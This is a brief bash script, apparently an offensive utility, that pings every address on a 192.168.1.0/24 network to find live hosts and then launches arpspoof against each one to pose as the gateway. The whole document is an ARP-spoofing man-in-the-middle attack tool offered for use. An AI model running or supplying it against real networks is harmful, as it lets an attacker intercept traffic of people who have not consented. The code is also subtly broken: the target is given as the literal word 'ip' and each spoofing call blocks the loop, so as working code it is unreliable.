#! /bin/bash

# scan localnetwork and store alive host to a array
i=0
for ip in `fping -asg 192.168.1.0/24`
do
  ips[$i]=$ip
  let i=$i+1
done

# iterover array and start arpspoof to each ip separately 
for ip in ${ips[@]}
do
  echo $ip
  (arpspoof -i eth0 -t ip 192.168.1.1)
done
